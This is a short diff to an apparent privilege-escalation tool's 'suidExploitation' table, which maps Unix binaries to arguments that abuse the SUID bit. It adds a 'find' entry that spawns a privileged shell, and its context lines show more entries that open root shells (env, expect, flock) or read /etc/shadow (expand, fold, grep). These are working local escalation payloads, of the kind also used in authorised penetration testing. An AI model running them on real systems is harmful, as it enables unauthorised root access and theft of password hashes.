@@ -30,6 +30,7 @@ suidExploitation = {
 	'env': '/bin/sh -p',
 	'expand': '/etc/shadow',
 	'expect': '-c "spawn /bin/sh -p;interact"',
+	'find': '. -exec /bin/sh -p \\; -quit',
 	'flock': '-u / /bin/sh -p',
 	'fold': '-w99999999 /etc/shadow',
 	'grep': '"" /etc/shadow',
